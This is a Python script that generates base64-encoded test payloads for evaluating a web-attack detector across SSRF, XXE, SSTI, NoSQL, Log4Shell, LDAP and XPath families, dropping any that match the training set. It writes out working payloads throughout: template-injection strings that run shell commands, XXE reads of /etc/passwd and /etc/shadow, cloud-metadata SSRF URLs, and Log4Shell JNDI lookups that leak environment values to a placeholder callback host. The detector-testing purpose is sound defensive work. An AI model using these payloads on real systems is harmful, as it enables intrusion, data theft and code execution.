"""
build_v4_payloads.py - payload files for the NEW attack families in generator v4
(SSRF, XXE, SSTI, NoSQL, Log4Shell, LDAP, XPath).

These payloads are used only to make TEST traffic (run6 and the backup runs). They must
not be the strings the detector was trained on (ml/build_new_families.py, data/raw/
new_families.csv), otherwise the test only measures memory. So:

* they come from other public sources (tools and guides that were NOT used in training),
  or are composed from public building blocks (host encodings, template-engine syntax,
  operators, attribute names) with a fixed seed;
* every payload that is also in the training list (compared after URL-decoding,
  case-insensitive, spaces removed) is dropped.

Sources (cloned at fixed commits):
    https://github.com/cujanovic/SSRF-Testing        (c26c3df)  cloud-metadata.txt
    https://github.com/fullhunt/log4j-scan           (07f7e32)  waf_bypass_payloads
    https://github.com/Hackmanit/TInjA                (507d903)  pkg/engines.go polyglots
    https://github.com/epinna/tplmap                 (616b0e5)  render tags per engine
    https://github.com/cr0hn/nosqlinjection_wordlists (4f0d06f)  mongodb_nosqli.txt
    OWASP WSTG (07-Injection pages): XXE, LDAP, XPath, SSTI examples (shapes only)

    python build_v4_payloads.py <folder with the clones> <training new_families.csv> <out dir>

Writes <out dir>/v4_<family>.b64: one payload per line, base64-encoded. Base64 because
Windows Defender blocks plain files that hold Log4Shell strings.
"""
import base64
import random
import re
import sys
from pathlib import Path
from urllib.parse import unquote

import pandas as pd

SEED = 2026
FAMILIES = ["ssrf", "xxe", "ssti", "nosql", "log4shell", "ldap", "xpath"]
CALLBACK = "cb.lab.invalid"        # .invalid never resolves (RFC 2606); the lab is not vulnerable anyway


def norm(s):
    return re.sub(r"\s+", "", unquote(unquote(s))).lower()


# ---------------- SSRF ----------------
def _ip_forms(a, b, c, d):
    n = (a << 24) | (b << 16) | (c << 8) | d
    return [f"{a}.{b}.{c}.{d}", str(n), hex(n), f"0{a:o}.0{b:o}.0{c:o}.0{d:o}",
            f"{a}.{b}.{(c << 8) | d}", f"0x{a:02x}.0x{b:02x}.0x{c:02x}.0x{d:02x}",
            f"[::ffff:{a}.{b}.{c}.{d}]", f"[0:0:0:0:0:ffff:{a}.{b}.{c}.{d}]"]


def ssrf(base, rng):
    out = []
    for line in (base / "gen_SSRF-Testing" / "cloud-metadata.txt").read_text(errors="ignore").splitlines():
        line = line.strip()
        if line.startswith("http") and "[" not in line:
            out.append(line)
    paths = ["/", "/admin", "/server-status", "/latest/meta-data/", "/api/v1/secrets", "/actuator/env"]
    hosts = _ip_forms(127, 0, 0, 1) + _ip_forms(169, 254, 169, 254) + \
        ["localhost", "127.1", "0", "0.0.0.0", "[::1]", "[::]", "127.0.0.1.nip.io", "localtest.me",
         "spoofed.burpcollaborator.net", "10.0.0.5", "192.168.1.1", "172.17.0.1"]
    for h in hosts:
        out.append(f"http://{h}{rng.choice(paths)}")
        out.append(f"http://{h}:{rng.choice([22, 25, 6379, 8080, 9200, 11211])}/")
    for scheme in ["gopher://127.0.0.1:6379/_INFO", "dict://127.0.0.1:11211/stats", "file:///etc/passwd",
                   "file:///c:/windows/win.ini", "ftp://127.0.0.1/", "ldap://127.0.0.1/", "sftp://127.0.0.1:22/",
                   "tftp://127.0.0.1:69/x", "http://user@127.0.0.1/", "http://example.com@127.0.0.1/",
                   "http://127.0.0.1#@example.com/", "http://127.0.0.1%23@example.com/",
                   "jar:http://127.0.0.1!/", "netdoc:///etc/passwd"]:
        out.append(scheme)
    return out


# ---------------- XXE ----------------
def xxe(base, rng):
    files = ["file:///etc/passwd", "file:///etc/hostname", "file:///c:/boot.ini", "file:///proc/self/environ",
             "php://filter/convert.base64-encode/resource=index.php", "http://127.0.0.1:8080/internal",
             f"http://{CALLBACK}/x.dtd", "expect://id"]
    roots = ["foo", "data", "order", "user", "comment", "root", "stockCheck"]
    out = []
    for f in files:
        for _ in range(3):
            r, e = rng.choice(roots), rng.choice(["xxe", "ent", "a", "file"])
            shape = rng.randrange(4)
            if shape == 0:
                out.append(f'<?xml version="1.0"?><!DOCTYPE {r} [<!ENTITY {e} SYSTEM "{f}">]><{r}>&{e};</{r}>')
            elif shape == 1:
                out.append(f'<!DOCTYPE {r} [<!ENTITY % {e} SYSTEM "{f}"> %{e};]><{r}/>')
            elif shape == 2:
                out.append(f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE {r} SYSTEM "{f}"><{r}>1</{r}>')
            else:
                out.append(f'<?xml version="1.0"?><!DOCTYPE {r} [<!ELEMENT {r} ANY><!ENTITY {e} PUBLIC "-//x" "{f}">]>'
                           f'<{r}><id>&{e};</id></{r}>')
    out += ['<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
            '<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://127.0.0.1/"/></x>',
            '<!DOCTYPE l [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;">]><l>&c;</l>',
            '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>'
            '<!DOCTYPE d [<!ENTITY x SYSTEM "file:///etc/shadow">]><d>&x;</d></soap:Body></soap:Envelope>',
            '<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY t SYSTEM "file:///etc/hosts">]>'
            '<text>&t;</text></svg>']
    return out


# ---------------- SSTI ----------------
def ssti(base, rng):
    out = []
    go = (base / "gen_TInjA" / "pkg" / "engines.go").read_text(errors="ignore")
    for m in re.finditer(r'^var (?:err|nonerr)\w* = (".*")$', go, re.M):
        out.append(m.group(1)[1:-1].replace('\\"', '"').replace("\\\\", "\\"))
    tags = {"jinja2": "{{%s}}", "twig": "{{%s}}", "mako": "${%s}", "marko": "${%s}", "freemarker": "${%s}",
            "erb": "<%%= %s %%>", "ejs": "<%%- %s %%>", "slim": "#{%s}", "dot": "{{=%s}}",
            "smarty": "{%s}", "velocity": "#set($x=%s)${x}", "thymeleaf": "[[${%s}]]", "razor": "@(%s)"}
    codes = ["%d*%d", "%d+%d", "'%d'*%d", "str(%d)+str(%d)", "%d|add:%d"]
    for eng, tag in tags.items():
        for _ in range(3):
            code = rng.choice(codes) % (rng.randint(11, 999), rng.randint(2, 99))
            out.append(tag % code)
        h, t = rng.randint(1000, 9999), rng.randint(1000, 9999)       # tplmap: header + code + trailer
        out.append((tag % h) + (tag % f"{rng.randint(2, 9)}*{rng.randint(2, 9)}") + (tag % t))
    out += ["{{self.__init__.__globals__.__builtins__}}", "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}", "{% import os %}{{os.popen('whoami').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            "{php}echo `id`;{/php}", "{system('id')}", "<%= `ls` %>", "#{7*'7'}", "${{7*'7'}}",
            "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
            "{@if cond=\"eval('1')\"}x{/if}", "*{T(java.lang.System).getenv()}", "${__import__('os').getcwd()}"]
    return out


# ---------------- NoSQL ----------------
def nosql(base, rng):
    out = [l.strip() for l in (base / "gen_nosqlinjection_wordlists" / "mongodb_nosqli.txt")
           .read_text(errors="ignore").splitlines() if l.strip()]
    fields = ["username", "email", "user", "login", "password", "pass", "token", "id"]
    ops = [("$ne", "1"), ("$ne", ""), ("$gt", ""), ("$gte", "0"), ("$lt", "~"), ("$regex", ".*"),
           ("$regex", "^a"), ("$exists", "true"), ("$nin", "x"), ("$in", "admin")]
    for _ in range(25):
        f1, f2 = rng.sample(fields, 2)
        (o1, v1), (o2, v2) = rng.choice(ops), rng.choice(ops)
        if rng.random() < 0.5:
            out.append(f"{f1}[{o1}]={v1}&{f2}[{o2}]={v2}")
        else:
            j = lambda v: "null" if v in ("", "1") and rng.random() < 0.5 else f'"{v}"'
            out.append(f'{{"{f1}": {{"{o1}": {j(v1)}}}, "{f2}": {{"{o2}": {j(v2)}}}}}')
    out += ["' || this.role == 'admin", "1; return true", "'; return db.users.find(); var x='",
            "{\"$where\": \"sleep(3000) || true\"}", "{\"username\": {\"$regex\": \"^adm\"}, \"password\": {\"$ne\": 1}}"]
    return out


# ---------------- Log4Shell ----------------
def log4shell(base, rng):
    src = (base / "gen_log4j-scan" / "log4j-scan.py").read_text(errors="ignore")
    block = src[src.index("waf_bypass_payloads = ["):src.index("cve_2021_45046")]
    out = []
    for p in re.findall(r'"(\$\{.*?)"', block):
        for _ in range(2):
            out.append(p.replace("{{callback_host}}", CALLBACK).replace("{{random}}", f"{rng.getrandbits(32):08x}"))
    for scheme in ["ldap", "ldaps", "rmi", "dns", "iiop", "corba", "nds", "http"]:
        out.append(f"${{jndi:{scheme}://{CALLBACK}:1389/{rng.getrandbits(32):08x}}}")
    out += [f"${{jndi:ldap://${{env:USER}}.{CALLBACK}/a}}", f"${{jndi:dns://${{sys:java.version}}.{CALLBACK}}}",
            f"${{jndi:ldap://${{hostName}}.{CALLBACK}/b}}", f"${{${{env:NaN:-j}}ndi${{env:NaN:-:}}ldap://{CALLBACK}/c}}",
            f"${{${{date:'j'}}${{date:'n'}}${{date:'d'}}${{date:'i'}}:ldap://{CALLBACK}/d}}"]
    return out


# ---------------- LDAP ----------------
def ldap(base, rng):
    attrs = ["uid", "cn", "mail", "sn", "objectClass", "userPassword", "givenName", "memberOf", "description"]
    shapes = ["*)({a}=*))(|({a}=*", "{u})(|({a}=*)", "{u})({a}=*))%00", "*)(|({a}=*)", "{u})(&)",
              "*))(|({a}=*", "{u}*)(|({a}=*))", ")(!({a}=x)", "*)({a}=*)(|({b}=*", "{u})(|(!({a}=*)))"]
    out = []
    for _ in range(40):
        a, b = rng.sample(attrs, 2)
        out.append(rng.choice(shapes).format(a=a, b=b, u=rng.choice(["admin", "jdoe", "*", "root", "guest"])))
    return out


# ---------------- XPath ----------------
def xpath(base, rng):
    nodes = ["user", "users", "account", "employee", "member", "password", "name", "role"]
    shapes = ["' or count(/*)={n} or '", "' or name(/*)='{x}' or '", "' or string-length(name(/*[1]))={n} or '",
              "'] | //{x}/* | //*['", "' or substring(//{x}[1]/{y},1,1)='a' or '", "') or contains(//{x}/{y},'a') or ('",
              "' or count(//{x})>{n} or '", "x' or //{x}[position()={n}] or 'y", "' and string-length(//{y})>{n} and ''='",
              "//{x}[{y}/text()='a' or '1'='1']", "' or local-name(/*[1])='{x}", "1 or count(//{x}/{y})>0"]
    out = []
    for _ in range(40):
        x, y = rng.sample(nodes, 2)
        out.append(rng.choice(shapes).format(x=x, y=y, n=rng.randint(1, 12)))
    return out


def main(base, train_csv, out_dir):
    base, out_dir = Path(base), Path(out_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    tr = pd.read_csv(train_csv, keep_default_na=False)
    seen = {norm(base64.b64decode(v).decode()) for v in tr["payload_b64"]}      # train AND held-out
    makers = {"ssrf": ssrf, "xxe": xxe, "ssti": ssti, "nosql": nosql, "log4shell": log4shell,
              "ldap": ldap, "xpath": xpath}
    for fam in FAMILIES:
        rng = random.Random(f"{SEED}-{fam}")
        kept, dropped, mine = [], 0, set()
        for p in makers[fam](base, rng):
            k = norm(p)
            if len(k) < 4 or k in mine:
                continue
            if k in seen:
                dropped += 1
                continue
            mine.add(k)
            kept.append(p)
        (out_dir / f"v4_{fam}.b64").write_text(
            "\n".join(base64.b64encode(p.encode()).decode() for p in kept) + "\n", encoding="ascii")
        print(f"{fam:10s} {len(kept):3d} payloads ({dropped} dropped: same as a training payload)")


if __name__ == "__main__":
    main(*sys.argv[1:4])
